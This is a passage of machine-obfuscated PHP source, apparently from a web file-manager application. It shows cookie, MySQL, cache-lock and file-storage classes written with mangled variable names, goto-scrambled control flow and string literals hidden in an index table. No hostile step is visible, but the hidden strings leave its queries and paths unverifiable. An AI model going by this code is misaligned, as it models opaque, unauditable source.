if ($this->isCluster) { foreach ($this->handle->_masters() as $BŸ ùƒø†) { $this->handle->flushall($BŸ ùƒø†); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($eŞ¦É®‚Ûİ = '', $CùˆêÆŒ‡ = 0) { if (is_string($eŞ¦É®‚Ûİ) && $eŞ¦É®‚Ûİ != $_SERVER[Ö][33]) { $this->prefix = $eŞ¦É®‚Ûİ; } if (is_numeric($CùˆêÆŒ‡) && $CùˆêÆŒ‡ > 0) { $this->expire = $CùˆêÆŒ‡; } } public static function getInstance() { static $AÏöË˜ÔÛ†; if ($AÏöË˜ÔÛ† === null) { $AÏöË˜ÔÛ† = new self(); } return $AÏöË˜ÔÛ†; } private static $sameCookieSet = array(); public static function set($aÚƒß…«¥Ï, $e‡±çäÙ§, $aÚóÀ¸¡·Í = 0, $A²Óğİ‡‡Ş = false, $b±ØÆ¾ ‘ó = false) { goto cİâäĞ…Ğ¨; bÂ¬ĞøëŠ¸: setcookie($aÚƒß…«¥Ï, $e‡±çäÙ§, time() + $aÚóÀ¸¡·Í, $aò¨âï‘›ù[8] . trim($b±ØÆ¾ ‘ó, $aò¨âï‘›ù[8]) . $fŒÕˆ™å„š, !1, !1, $A²Óğİ‡‡Ş); goto F¹«¶Ü‰Õô; cİâäĞ…Ğ¨: $aò¨âï‘›ù =& $_SERVER[Ö]; if (!$aÚóÀ¸¡·Í) { $aÚóÀ¸¡·Í = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$aÚƒß…«¥Ï]) && self::$sameCookieSet[$aÚƒß…«¥Ï] == $e‡±çäÙ§ . $aÚóÀ¸¡·Í) { return; } goto f·ä¸î¢‹À; f·ä¸î¢‹À: self::$sameCookieSet[$aÚƒß…«¥Ï] = $e‡±çäÙ§ . $aÚóÀ¸¡·Í; if (!$b±ØÆ¾ ‘ó) { $b±ØÆ¾ ‘ó = str_replace(HOST, $aò¨âï‘›ù[33], APP_HOST); $b±ØÆ¾ ‘ó = _get($GLOBALS, $aò¨âï‘›ù[792], $b±ØÆ¾ ‘ó); } $fŒÕˆ™å„š = $aò¨âï‘›ù[33]; goto bÂ¬ĞøëŠ¸; F¹«¶Ü‰Õô: } public static function setSafe($FÁ­ ê¡òî, $d´ÛàÑËï, $B£˜Ä´Á¦¥ = 0) { self::set($FÁ­ ê¡òî, $d´ÛàÑËï, $B£˜Ä´Á¦¥, !0); } public static function get($B„—©µÁ†ò) { return isset($_COOKIE[$B„—©µÁ†ò]) ? $_COOKIE[$B„—©µÁ†ò] : !1; } public static function remove($Eç‡Ô´•Û, $DÑñ¡Åõù = false) { unset($_COOKIE[$Eç‡Ô´•Û]); self::set($Eç‡Ô´•Û, $_SERVER[Ö][33], 1, $DÑñ¡Åõù); } } class DbMysql extends Db { public function __construct($D–ù…íÏê¤ = '') { $cª¢ÇÇâËÖ =& $_SERVER[Ö]; if (!extension_loaded($cª¢ÇÇâËÖ[721])) { think_exception(think_lang($cª¢ÇÇâËÖ[10]) . $cª¢ÇÇâËÖ[793]); } if (!empty($D–ù…íÏê¤)) { $this->config = $D–ù…íÏê¤; if (empty($this->config[$cª¢ÇÇâËÖ[13]])) { $this->config[$cª¢ÇÇâËÖ[13]] = $cª¢ÇÇâËÖ[33]; } } } public function connect($D» ÓŒ•¥¡ = '', $Aœ²ÛŒÎÍ† = 0, $BŠ’Ê©âìÎ = false) { $E‰¤äã¿À» =& $_SERVER[Ö]; if (!isset($this->linkID[$Aœ²ÛŒÎÍ†])) { goto DÓğº×ÚÃò; DÓğº×ÚÃò: if (empty($D» ÓŒ•¥¡)) { $D» ÓŒ•¥¡ = $this->config; } $DØù¼­Ï›Š = $D» ÓŒ•¥¡[$E‰¤äã¿À»[794]] . ($D» ÓŒ•¥¡[$E‰¤äã¿À»[795]] ? "\72{$D» ÓŒ•¥¡[$E‰¤äã¿À»[795]]}" : $E‰¤äã¿À»[33]); $Cİ¡˜‚ÆÖ = !empty($D» ÓŒ•¥¡[$E‰¤äã¿À»[13]][$E‰¤äã¿À»[14]]) ? $D» ÓŒ•¥¡[$E‰¤äã¿À»[13]][$E‰¤äã¿À»[14]] : $this->pconnect; goto CË„¹Á¢˜´; d ¨áéÒã: mysql_query($E‰¤äã¿À»[798] . think_config($E‰¤äã¿À»[799]) . $E‰¤äã¿À»[55], $this->linkID[$Aœ²ÛŒÎÍ†]); if ($EŒç°ÀÍÓ > $E‰¤äã¿À»[800]) { mysql_query($E‰¤äã¿À»[801], $this->linkID[$Aœ²ÛŒÎÍ†]); } $this->connected = !0; goto bàÁ±‹Ú—; CË„¹Á¢˜´: if ($Cİ¡˜‚ÆÖ) { $this->linkID[$Aœ²ÛŒÎÍ†] = mysql_pconnect($DØù¼­Ï›Š, $D» ÓŒ•¥¡[$E‰¤äã¿À»[796]], $D» ÓŒ•¥¡[$E‰¤äã¿À»[797]], 131072); } else { $this->linkID[$Aœ²ÛŒÎÍ†] = mysql_connect($DØù¼­Ï›Š, $D» ÓŒ•¥¡[$E‰¤äã¿À»[796]], $D» ÓŒ•¥¡[$E‰¤äã¿À»[797]], !0, 131072); } if (!$this->linkID[$Aœ²ÛŒÎÍ†] || !empty($D» ÓŒ•¥¡[$E‰¤äã¿À»[17]]) && !mysql_select_db($D» ÓŒ•¥¡[$E‰¤äã¿À»[17]], $this->linkID[$Aœ²ÛŒÎÍ†])) { think_exception(mysql_error()); } $EŒç°ÀÍÓ = mysql_get_server_info($this->linkID[$Aœ²ÛŒÎÍ†]); goto d ¨áéÒã; bàÁ±‹Ú—: if (1 != think_config($E‰¤äã¿À»[18])) { unset($this->config); } goto bøåøê‹öİ; bøåøê‹öİ: } return $this->linkID[$Aœ²ÛŒÎÍ†]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($cªÙ×»‹„Ó) { goto bÚ†½¿”È¤; bÚ†½¿”È¤: $aŠ÷˜àÙ =& $_SERVER[Ö]; if (0 === stripos($cªÙ×»‹„Ó, $aŠ÷˜àÙ[248])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto bª“”Ú‰Ù; eÇ‡¹Ñ…¡Ò: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto cçÄÄÊÚè; cÁ Ø¸ŠÑ: think_action_status($aŠ÷˜àÙ[19], 1); think_status($aŠ÷˜àÙ[20]); $this->queryID = mysql_query($cªÙ×»‹„Ó, $this->_linkID); goto eÇ‡¹Ñ…¡Ò; bª“”Ú‰Ù: if (!$this->_linkID) { return !1; } $this->queryStr = $cªÙ×»‹„Ó; if ($this->queryID) { $this->free(); } goto cÁ Ø¸ŠÑ; cçÄÄÊÚè: } public function execute($fÚÆÂÕİ±) { goto Bƒ¯Ü¿Œ‹; Bƒ¯Ü¿Œ‹: $e˜ÙõÉÆ„® =& $_SERVER[Ö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A¡‹‡Ì; fçé×„¸Šø: if (!1 === $D‡»ª™ŸÏà) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto A¦±©× È; A¡‹‡Ì: $this->queryStr = $fÚÆÂÕİ±; if ($this->queryID) { $this->free(); } think_action_status($e˜ÙõÉÆ„®[21], 1); goto BæĞ¸‡¿÷; BæĞ¸‡¿÷: think_status($e˜ÙõÉÆ„®[20]); $D‡»ª™ŸÏà = mysql_query($fÚÆÂÕİ±, $this->_linkID); $this->debug(); goto fçé×„¸Šø; A¦±©× È: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ö][802], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $CÕâ¶æ‹ºÚ = mysql_query($_SERVER[Ö][803], $this->_linkID); $this->transTimes = 0; if (!$CÕâ¶æ‹ºÚ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $C¢ğ”¸ƒà¨ = mysql_query($_SERVER[Ö][804], $this->_linkID); $this->transTimes = 0; if (!$C¢ğ”¸ƒà¨) { $this->error(); return !1; } } return !0; } private function getAll() { $D­ŠÌ†µ¨ = array(); if ($this->numRows > 0) { while ($då˜ßßµŸè = mysql_fetch_assoc($this->queryID)) { $D­ŠÌ†µ¨[] = $då˜ßßµŸè; } mysql_data_seek($this->queryID, 0); } return $D­ŠÌ†µ¨; } public function getFields($F‘ë‹„®Ù¤) { $DÁš—Ê¢› =& $_SERVER[Ö]; $eÜ—®Èó«™ = $this->query($DÁš—Ê¢›[805] . $this->parseKey($F‘ë‹„®Ù¤)); $eÍ”œ³õ‡ = array(); if ($eÜ—®Èó«™) { foreach ($eÜ—®Èó«™ as $C¼œ»½«  => $dç‡”¼—å¶) { $eÍ”œ³õ‡[$dç‡”¼—å¶[$DÁš—Ê¢›[27]]] = array($DÁš—Ê¢›[28] => $dç‡”¼—å¶[$DÁš—Ê¢›[27]], $DÁš—Ê¢›[29] => $dç‡”¼—å¶[$DÁš—Ê¢›[30]], $DÁš—Ê¢›[31] => (bool) (strtoupper($dç‡”¼—å¶[$DÁš—Ê¢›[32]]) === $DÁš—Ê¢›[806]), $DÁš—Ê¢›[34] => $dç‡”¼—å¶[$DÁš—Ê¢›[35]], $DÁš—Ê¢›[36] => strtolower($dç‡”¼—å¶[$DÁš—Ê¢›[37]]) == $DÁš—Ê¢›[38], $DÁš—Ê¢›[39] => strtolower($dç‡”¼—å¶[$DÁš—Ê¢›[40]]) == $DÁš—Ê¢›[41]); } } return $eÍ”œ³õ‡; } public function getTables($bºÎÂŒ¼ßæ = '') { $D¢›™Äç˜‘ =& $_SERVER[Ö]; if (!empty($bºÎÂŒ¼ßæ)) { $D¶£È£á‹´ = $D¢›™Äç˜‘[807] . $bºÎÂŒ¼ßæ; } else { $D¶£È£á‹´ = $D¢›™Äç˜‘[808]; } $FŠéğÃŞ© = $this->query($D¶£È£á‹´); $FÙ™Û‚†Ó = array(); foreach ($FŠéğÃŞ© as $B¨‰†æ‘§Ó => $dˆíÄÀ„ó) { $FÙ™Û‚†Ó[$B¨‰†æ‘§Ó] = current($dˆíÄÀ„ó); } return $FÙ™Û‚†Ó; } public function replace($dÇ–ˆÆÙ¡ç, $bœË„’÷³¼ = array()) { $BêÈİŠÒĞÛ =& $_SERVER[Ö]; foreach ($dÇ–ˆÆÙ¡ç as $fêñ÷„¬å => $FÆã‹ìÌğ¸) { $D£Äô¡ëŒ± = $this->parseValue($FÆã‹ìÌğ¸); if (is_scalar($D£Äô¡ëŒ±)) { $B˜Å¸´‘Ñ[] = $D£Äô¡ëŒ±; $B„¡Š‚ÛÔ[] = $this->parseKey($fêñ÷„¬å); } } $e¦´ŠÔ‰Ÿ = $BêÈİŠÒĞÛ[809] . $this->parseTable($bœË„’÷³¼[$BêÈİŠÒĞÛ[263]]) . $BêÈİŠÒĞÛ[810] . implode($BêÈİŠÒĞÛ[47], $B„¡Š‚ÛÔ) . $BêÈİŠÒĞÛ[811] . implode($BêÈİŠÒĞÛ[47], $B˜Å¸´‘Ñ) . $BêÈİŠÒĞÛ[812]; return $this->execute($e¦´ŠÔ‰Ÿ); } public function insertAll($e‹Ó›±˜Ì›, $c¢Ûª–ßñ§ = array(), $D‘ÉÒ…”îÍ = false) { goto Fƒáìò÷»; CÊ¢´Éô¥“: $dÙ”¤¨öÓª = array(); foreach ($e‹Ó›±˜Ì› as $Eß¼¢Â…ñÚ) { $c£‚¥ùä®” = array(); foreach ($Eß¼¢Â…ñÚ as $AÕíìÏÔĞ³ => $b¥—¤ˆÜ×·) { $b¥—¤ˆÜ×· = $this->parseValue($b¥—¤ˆÜ×·); if (is_scalar($b¥—¤ˆÜ×·)) { $c£‚¥ùä®”[] = $b¥—¤ˆÜ×·; } } $dÙ”¤¨öÓª[] = $Dõ×‹Õ™ƒË[244] . implode($Dõ×‹Õ™ƒË[47], $c£‚¥ùä®”) . $Dõ×‹Õ™ƒË[812]; } array_walk($bØùÎ«ãÏ, array($this, $Dõ×‹Õ™ƒË[813])); goto aÉé‰—„Ãá; Fƒáìò÷»: $Dõ×‹Õ™ƒË =& $_SERVER[Ö]; if (!is_array($e‹Ó›±˜Ì›[0])) { return !1; } $bØùÎ«ãÏ = array_keys($e‹Ó›±˜Ì›[0]); goto CÊ¢´Éô¥“; aÉé‰—„Ãá: $B®¬‘èÎùä = ($D‘ÉÒ…”îÍ ? $Dõ×‹Õ™ƒË[814] : $Dõ×‹Õ™ƒË[815]) . $Dõ×‹Õ™ƒË[816] . $this->parseTable($c¢Ûª–ßñ§[$Dõ×‹Õ™ƒË[263]]) . $Dõ×‹Õ™ƒË[810] . implode($Dõ×‹Õ™ƒË[47], $bØùÎ«ãÏ) . $Dõ×‹Õ™ƒË[817] . implode($Dõ×‹Õ™ƒË[47], $dÙ”¤¨öÓª); return $this->execute($B®¬‘èÎùä); goto B’šõÚÅÎ±; B’šõÚÅÎ±: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $FÑÓˆ¾‘î =& $_SERVER[Ö]; $this->error = mysql_errno() . $FÑÓˆ¾‘î[4] . mysql_error($this->_linkID); if ($FÑÓˆ¾‘î[33] != $this->queryStr) { $this->error .= LNG($FÑÓˆ¾‘î[45]) . $this->queryStr; } think_trace($this->error, $FÑÓˆ¾‘î[33], $FÑÓˆ¾‘î[46]); return $this->error; } public function escapeString($D¾ç™ÈÊ) { if ($this->_linkID) { return mysql_real_escape_string($D¾ç™ÈÊ, $this->_linkID); } else { return mysql_escape_string($D¾ç™ÈÊ); } } public function parseKey(&$Aİí†±Û, $F½öÆ‰ÏÚ„ = true) { $Aƒ…‡ÒŒù© =& $_SERVER[Ö]; if ($F½öÆ‰ÏÚ„) { $Aİí†±Û = $this->parseKeyCheck($Aİí†±Û); } if ($Aİí†±Û != $Aƒ…‡ÒŒù©[172] && !preg_match($Aƒ…‡ÒŒù©[818], $Aİí†±Û)) { $Aİí†±Û = $Aƒ…‡ÒŒù©[819] . trim($Aİí†±Û, $Aƒ…‡ÒŒù©[819]) . $Aƒ…‡ÒŒù©[819]; } return $Aİí†±Û; } } goto CÖ³îôŞ•; Däİ´Í›¹: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Bƒ¥ŸÈòñ½ =& $_SERVER[Ö]; $c§Ãğš¨µ = $GLOBALS[$Bƒ¥ŸÈòñ½[6]][$Bƒ¥ŸÈòñ½[333]]; self::$cachePath = $c§Ãğš¨µ[$Bƒ¥ŸÈòñ½[163]][$Bƒ¥ŸÈòñ½[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($AìÂÑËİÍĞ, $A½²¦ë“‹ = 0) { goto e™ğ¨áÃÎä; e–’×ø˜ á: $D¸¬¹°¹ß¹ = rtrim(self::$cachePath, $fªÌ¸…ƒ¹Ä[8]) . $fªÌ¸…ƒ¹Ä[773] . md5($AìÂÑËİÍĞ) . $fªÌ¸…ƒ¹Ä[774]; if (file_exists($D¸¬¹°¹ß¹) && filemtime($D¸¬¹°¹ß¹) && filemtime($D¸¬¹°¹ß¹) < time() - 10) { @unlink($D¸¬¹°¹ß¹); } do { if (file_exists($D¸¬¹°¹ß¹)) { cacheLockWait(); continue; } $dã¹—ÜÌ•î = fopen($D¸¬¹°¹ß¹, $fªÌ¸…ƒ¹Ä[775]); if (!$dã¹—ÜÌ•î) { return !1; } $A¥ŸŠ¾‰‘³ = flock($dã¹—ÜÌ•î, LOCK_EX | LOCK_NB); self::$caches[$AìÂÑËİÍĞ] = array($fªÌ¸…ƒ¹Ä[776] => $dã¹—ÜÌ•î, $fªÌ¸…ƒ¹Ä[163] => $D¸¬¹°¹ß¹); fwrite($dã¹—ÜÌ•î, $bŠ‘êÈÉ÷«); clearstatcache(); if ($dã¹—ÜÌ•î && $A¥ŸŠ¾‰‘³) { return !0; } cacheLockWait(); } while (microtime(!0) < $bŠ‘êÈÉ÷«); goto dÂ½Äàˆ¶–; e™ğ¨áÃÎä: $fªÌ¸…ƒ¹Ä =& $_SERVER[Ö]; $FÇî®ô„Ò = microtime(!0); $bŠ‘êÈÉ÷« = $FÇî®ô„Ò + $A½²¦ë“‹ + 0.0001; goto e–’×ø˜ á; dÂ½Äàˆ¶–: $this->unlock($AìÂÑËİÍĞ); return !1; goto E‡÷†ç¿‘Ä; E‡÷†ç¿‘Ä: } public function lockGet($aóÔÔ¿„Ş) { $f‰›…‹ì¼³ =& $_SERVER[Ö]; $Cø…â·Á»é = rtrim(self::$cachePath, $f‰›…‹ì¼³[8]) . $f‰›…‹ì¼³[773] . md5($aóÔÔ¿„Ş) . $f‰›…‹ì¼³[774]; return file_exists($Cø…â·Á»é); } public function unlock($CïÀ¹öí¯) { goto Aá²ÛŒïñ¢; Aá²ÛŒïñ¢: $FïÍÁÁçİ =& $_SERVER[Ö]; $E‰Û…Ì‡¶Ä = self::$caches[$CïÀ¹öí¯]; if (!$E‰Û…Ì‡¶Ä) { return; } goto C¦Õïó£¼ˆ; C¦Õïó£¼ˆ: @flock($E‰Û…Ì‡¶Ä[$FïÍÁÁçİ[776]], LOCK_UN); @fclose($E‰Û…Ì‡¶Ä[$FïÍÁÁçİ[776]]); @unlink($E‰Û…Ì‡¶Ä[$FïÍÁÁçİ[163]]); goto AÃÛºÇ–”¥; AÃÛºÇ–”¥: unset(self::$caches[$CïÀ¹öí¯]); goto EŸÙ²èÛ‚; EŸÙ²èÛ‚: } } class CacheLockRedis { public function lock($Eï¡ù¢œÁ×, $BîÌÓ†ÜæÔ = 10) { $DÓ²Ûïõİ„ = Cache::init(); $bõ¶í÷›‘¡ = microtime(!0) + $BîÌÓ†ÜæÔ; while (microtime(!0) < $bõ¶í÷›‘¡) { $aÛĞ´‘ï = $DÓ²Ûïõİ„->get($Eï¡ù¢œÁ×); if (!$aÛĞ´‘ï) { $Eî–´ÏÒˆ = $DÓ²Ûïõİ„->setLock($Eï¡ù¢œÁ×, $bõ¶í÷›‘¡, $BîÌÓ†ÜæÔ); if ($Eî–´ÏÒˆ) { return !0; } } else { if ($aÛĞ´‘ï < microtime(!0)) { $DÓ²Ûïõİ„->set($Eï¡ù¢œÁ×, $bõ¶í÷›‘¡, $bõ¶í÷›‘¡); if ($DÓ²Ûïõİ„->get($Eï¡ù¢œÁ×) === $aÛĞ´‘ï) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Bˆã­ØàÖÛ) { return Cache::init()->get($Bˆã­ØàÖÛ); } public function unlock($d‡‰†¸•) { return Cache::init()->remove($d‡‰†¸•); } } goto Dò™•Ïİİ; bïáŸĞƒŒ¤: class FileModel extends ModelBase { protected $tableName = "\x69\157\137\146\151\x6c\x65"; protected $tableMeta = array("\164\x61\x62\154\x65\x4e\141\155\x65" => "\x69\x6f\x5f\x66\x69\154\145\137\155\145\164\141", "\x6d\x65\x74\141\x46\151\145\154\144" => "\x66\151\154\x65\111\x44"); public function fileInfo($C¨œíº) { $DáÆÙŸ‹Á =& $_SERVER[Ö]; static $E³äÙ‰‰£Á = array(); if (!isset($E³äÙ‰‰£Á[$C¨œíº])) { $b´”šâœ–è = $DáÆÙŸ‹Á[2119]; $bçô‡©êÜš = Model($DáÆÙŸ‹Á[418])->field($b´”šâœ–è)->where(array($DáÆÙŸ‹Á[416] => $C¨œíº))->find(); $E³äÙ‰‰£Á[$C¨œíº] = $bçô‡©êÜš; } return $E³äÙ‰‰£Á[$C¨œíº]; } public function addFileByContent($f¥ø¹¦”‘ = '', $cÈ“ŒØÀô = '') { goto E ñ“»–èñ; E ñ“»–èñ: $f±éë„á±† =& $_SERVER[Ö]; $C–Õ–Ñ¬ = TEMP_PATH . $f±éë„á±†[2120]; if (!is_dir($C–Õ–Ñ¬)) { mk_dir($C–Õ–Ñ¬); } goto dÒ…ù÷á; dÒ…ù÷á: $Cİ¼Ã‘’Áó = $C–Õ–Ñ¬ . $f±éë„á±†[2121] . rand_string(16); file_put_contents($Cİ¼Ã‘’Áó, $f¥ø¹¦”‘); $F¿•à‚‰Û¥ = $this->addFile($Cİ¼Ã‘’Áó, $cÈ“ŒØÀô, !0); goto A¢ñ“½›ù; A¢ñ“½›ù: if (file_exists($Cİ¼Ã‘’Áó)) { @unlink($Cİ¼Ã‘’Áó); } return $F¿•à‚‰Û¥; goto c…·§—•ßŒ; c…·§—•ßŒ: } public function createFileName($FÙ…‘Ï»‘®) { goto a™¸åÃ´å‰; e £°Œì‡·: if (!$fÈ¥—í‡Ú && !Cache::get($d”‘ÒÆ—Õ)) { $fÈ¥—í‡Ú = !0; $Eøø¡ = IO::mkdir($e¸ô¨‹é); if (!IO::exist($Eøø¡ . $AÏàŠ²æ¸š[2123])) { IO::mkfile($Eøø¡ . $AÏàŠ²æ¸š[2123]); } Cache::set($d”‘ÒÆ—Õ, 1, 3600 * 2); } return $aôµèÁ¦§¾; goto cĞ“Á“»Úõ; cÎèğ½Š¯: $e¸ô¨‹é = $dğÛ‰ÃÛè->pathFather($aôµèÁ¦§¾); static $fÈ¥—í‡Ú = false; $d”‘ÒÆ—Õ = $AÏàŠ²æ¸š[2122] . md5($e¸ô¨‹é); goto e £°Œì‡·; a™¸åÃ´å‰: $AÏàŠ²æ¸š =& $_SERVER[Ö]; $dğÛ‰ÃÛè = IO::init($AÏàŠ²æ¸š[8]); $aôµèÁ¦§¾ = $this->makeFilePath($FÙ…‘Ï»‘®, $dğÛ‰ÃÛè); goto cÎèğ½Š¯; cĞ“Á“»Úõ: } public function makeFilePath($bÑÏ½êÀÊ, $C„óƒ‘Œ…Î) { goto B™ªÄ„¯Ì; B™ªÄ„¯Ì: $d«•®äŒÌ =& $_SERVER[Ö]; $A…ëÑ„…àâ = Model($d«•®äŒÌ[1081])->get($d«•®äŒÌ[2124]); $E¸ºóæò¼ = KodIO::defaultIO() . date($d«•®äŒÌ[2125]); goto a±§ÆğÉ Õ; BãòØ®²Õ: switch ($A…ëÑ„…àâ) { case $d«•®äŒÌ[2127]: $e«Ò¬„®’ô = $e«Ò¬„®’ô . $d«•®äŒÌ[91] . $C„óƒ‘Œ…Î->ext($bÑÏ½êÀÊ); if ($C„óƒ‘Œ…Î->ext($bÑÏ½êÀÊ) == $d«•®äŒÌ[2067]) { $e«Ò¬„®’ô .= $d«•®äŒÌ[2128]; } break; case $d«•®äŒÌ[2129]: goto Aé•Ìˆ¯; DéÜ¼È›: break; goto aŸë†é—ˆ; Aé•Ìˆ¯: $D…²òÌÀÙ = Model($d«•®äŒÌ[1081])->get($d«•®äŒÌ[1313]); $fˆ®÷ÜÕ‘‘ = substr(md5($d«•®äŒÌ[1887] . $D…²òÌÀÙ . date($d«•®äŒÌ[680])), 0, 8); $E¸ºóæò¼ = KodIO::defaultIO() . date($d«•®äŒÌ[2130]) . $fˆ®÷ÜÕ‘‘ . $d«•®äŒÌ[8]; goto D–Ô¡‡˜Ëİ; D–Ô¡‡˜Ëİ: if ($C„óƒ‘Œ…Î->ext($bÑÏ½êÀÊ) == $d«•®äŒÌ[2067]) { $bÑÏ½êÀÊ .= $d«•®äŒÌ[2128]; } $dö‰™Éé‹½ = IO::fileNameAuto($E¸ºóæò¼, $bÑÏ½êÀÊ); $e«Ò¬„®’ô = $E¸ºóæò¼ . $dö‰™Éé‹½; goto DéÜ¼È›; aŸë†é—ˆ: case $d«•®äŒÌ[2126]: break; default: break; } return $e«Ò¬„®’ô; goto f¥•ÛœŠï‡; a±§ÆğÉ Õ: $e«Ò¬„®’ô = $E¸ºóæò¼ . rand_string(5) . short_id(100); $bÑÏ½êÀÊ = str_replace($d«•®äŒÌ[8], $d«•®äŒÌ[70], KodIO::clear($bÑÏ½êÀÊ)); if (!$bÑÏ½êÀÊ) { $A…ëÑ„…àâ = $d«•®äŒÌ[2126]; } goto BãòØ®²Õ; f¥•ÛœŠï‡: } public function addFileByRemote($FÁã’èÀáí, $AíÎÇ¥Ô–, $A‘šçÛÙæ = array()) { goto b¦§«„òå¢; Eã°éª‘ï: if ($E‘ÔºÔÁª– = $this->addFileCheckExist($F±••Àˆ¡ù[$A²é÷âÀÃ[160]], $F±••Àˆ¡ù[$A²é÷âÀÃ[159]], $F±••Àˆ¡ù[$A²é÷âÀÃ[77]])) { return $E‘ÔºÔÁª–; } return $this->addFileData($F±••Àˆ¡ù); goto eà—‹Û•ÖÍ; f‹ªÛ¯ºÓ²: $aõŸñÏ¦Ôƒ = IO::hashMd5($FÁã’èÀáí, $a¹¨ğ°¾ù±); $fÙºÉ²®ËÌ = KodIO::defaultDriver(); $F±••Àˆ¡ù = array($A²é÷âÀÃ[516] => IO::size($FÁã’èÀáí), $A²é÷âÀÃ[2131] => 1, $A²é÷âÀÃ[382] => $AíÎÇ¥Ô–, $A²é÷âÀÃ[728] => $fÙºÉ²®ËÌ[$A²é÷âÀÃ[363]], $A²é÷âÀÃ[383] => $FÁã’èÀáí, $A²é÷âÀÃ[2132] => $A‘šçÛÙæ[$A²é÷âÀÃ[160]] ? $A‘šçÛÙæ[$A²é÷âÀÃ[160]] : IO::hashSimple($FÁã’èÀáí), $A²é÷âÀÃ[2133] => $aõŸñÏ¦Ôƒ ? $aõŸñÏ¦Ôƒ : $a¹¨ğ°¾ù±); goto Eã°éª‘ï; b¦§«„òå¢: $A²é÷âÀÃ =& $_SERVER[Ö]; if (!IO::exist($FÁã’èÀáí)) { return !1; } $a¹¨ğ°¾ù± = $A‘šçÛÙæ[$A²é÷âÀÃ[159]] ? $A‘šçÛÙæ[$A²é÷âÀÃ[159]] : $A²é÷âÀÃ[33]; goto f‹ªÛ¯ºÓ²; eà—‹Û•ÖÍ: } private function addFileData($CšÇœŒ¤•î) { $EæºÑêÂµ† =& $_SERVER[Ö]; if (!$CšÇœŒ¤•î) { return !1; } $CšÇœŒ¤•î[$EæºÑêÂµ†[77]] = intval($CšÇœŒ¤•î[$EæºÑêÂµ†[77]]); if (!$CšÇœŒ¤•î[$EæºÑêÂµ†[77]] && strlen($CšÇœŒ¤•î[$EæºÑêÂµ†[160]]) > 32) { $CšÇœŒ¤•î[$EæºÑêÂµ†[77]] = intval(substr($CšÇœŒ¤•î[$EæºÑêÂµ†[160]], 32)); } $cçöŞ×£Ú° = $this->add($CšÇœŒ¤•î); return $this->find($cçöŞ×£Ú°); } public function addFile($a•÷¶ƒÂÈÓ, $D·›­È÷œ›, $Fñ÷ãéÚ = false) { $eÍœòÜ”Ë¹ = IO::hashSimple($a•÷¶ƒÂÈÓ); $E¢®—ÍÙ²„ = IO::hashMd5($a•÷¶ƒÂÈÓ); $c¬ˆÖÀ—¥ç = IO::size($a•÷¶ƒÂÈÓ); if ($eõŞ®À­µ = $this->addFileCheckExist($eÍœòÜ”Ë¹, $E¢®—ÍÙ²„, $c¬ˆÖÀ—¥ç)) { return $eõŞ®À­µ; } $d¨µñ–«¢£ = $this->addFileMake($a•÷¶ƒÂÈÓ, $c¬ˆÖÀ—¥ç, $eÍœòÜ”Ë¹, $E¢®—ÍÙ²„, $D·›­È÷œ›, $Fñ÷ãéÚ); return $this->addFileData($d¨µñ–«¢£); } public function addFileMake($f“‰ç÷â¬Ì, $B¨…™ÒÎ£‰, $eÇè‚âš˜, $aœÎºÆÂ­, $E‰Ç±Ë”…Œ, $f†«‘¯çÆ¹) { goto BÅğÌ™×½; c¶Æ£……: $A”‰îÆê¹ = KodIO::defaultDriver(); $e÷ÇÄ‚ƒŠ = array($BáÏ«—”†[516] => $B¨…™ÒÎ£‰, $BáÏ«—”†[2131] => 1, $BáÏ«—”†[382] => $E‰Ç±Ë”…Œ, $BáÏ«—”†[728] => $A”‰îÆê¹[$BáÏ«—”†[363]], $BáÏ«—”†[383] => $DŒË’ˆ®¥Ú, $BáÏ«—”†[2132] => $eÇè‚âš˜, $BáÏ«—”†[2133] => $aœÎºÆÂ­); return $e÷ÇÄ‚ƒŠ; goto C¡ö¼£éáÚ; BÅğÌ™×½: $BáÏ«—”† =& $_SERVER[Ö]; $DŒË’ˆ®¥Ú = $this->createFileName($E‰Ç±Ë”…Œ); $d…òÕÚ×Î = get_path_father($DŒË’ˆ®¥Ú); goto c¯–ßùÉò‰; c¯–ßùÉò‰: $d¤Ç°ô…âÅ = get_path_this($DŒË’ˆ®¥Ú); if ($f†«‘¯çÆ¹) { $Cœª³ËÒÓ = IO::move($f“‰ç÷â¬Ì, $d…òÕÚ×Î, !1, $d¤Ç°ô…âÅ); } else { $Cœª³ËÒÓ = IO::copy($f“‰ç÷â¬Ì, $d…òÕÚ×Î, !1, $d¤Ç°ô…âÅ); } if (!$Cœª³ËÒÓ) { return !1; } goto c¶Æ£……; C¡ö¼£éáÚ: } public function addFileCheckExist($aéÁŠÜŒ¿Î, $dº›ÜØô¢, $B‰¬ÉÅö‘¤) { $DÂº™ß†•Ø =& $_SERVER[Ö]; $a¨â³‡Öã = $this->findByHash($aéÁŠÜŒ¿Î, $dº›ÜØô¢); if (!$a¨â³‡Öã) { return !1; } $d½ëò¿±Ö = array($DÂº™ß†•Ø[2131] => intval($a¨â³‡Öã[$DÂº™ß†•Ø[2134]]) + 1, $DÂº™ß†•Ø[516] => $B‰¬ÉÅö‘¤); $this->where(array($DÂº™ß†•Ø[416] => $a¨â³‡Öã[$DÂº™ß†•Ø[415]]))->save($d½ëò¿±Ö); return $a¨â³‡Öã; } public function remove($d¡·¼Î”‚É) { $this->linkCountChange($d¡·¼Î”‚É, !1); $this->clearEmpty(); return !0; } public function linkAdd($D­³ƒ«ßçå) { $this->linkCountChange($D­³ƒ«ßçå, !0); } public function linkCountChange($EÙÖĞö ïœ, 